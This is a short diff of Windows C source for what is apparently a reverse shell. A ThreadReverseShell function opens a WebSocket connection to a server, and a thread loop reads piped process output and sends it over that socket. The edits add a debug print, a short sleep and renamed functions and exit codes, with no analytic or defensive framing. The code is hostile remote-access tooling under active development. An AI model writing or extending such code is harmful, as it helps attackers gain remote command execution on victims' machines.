@@ -137,13 +137,14 @@ DWORD WINAPI ThreadProc(HANDLE wsData)
     while (TRUE)
     {
         CHAR buffer[LWS_PRE + BUFSIZE] = { 0 };
-
-        if (ReadFromPipe((struct WebSocketData*)wsData, buffer, sizeof(buffer)) == FALSE)
+        printf("%d\n", ((WebSocketData*)wsData)->socket);
+        if (ReadFromPipe((WebSocketData*)wsData, buffer, sizeof(buffer)) == FALSE)
         {
             printf("Failed to read from stdout in the created thread");
         }
 
-        printf("%s\n", buffer);
+        printf("%s", buffer);
+        Sleep(10);
         lws_write(((WebSocketData*)wsData)->socket, (LPBYTE)buffer, strlen(buffer), LWS_WRITE_BINARY);
     }
 
@@ -152,13 +153,13 @@ DWORD WINAPI ThreadProc(HANDLE wsData)
 /********************************************************************************************************************************/
 DWORD WINAPI ThreadReverseShell()
 {
-    if (WS_Connection() == FALSE)
+    if (!WebSocketConnection())
     {
         printf("Failed to initiate connection with the server\n");
-        ExitThread(-1);
+        ExitThread(EXIT_FAILURE);
     }
 
-    ExitThread(0);
+    ExitThread(EXIT_SUCCESS);
 }
 /********************************************************************************************************************************/
 
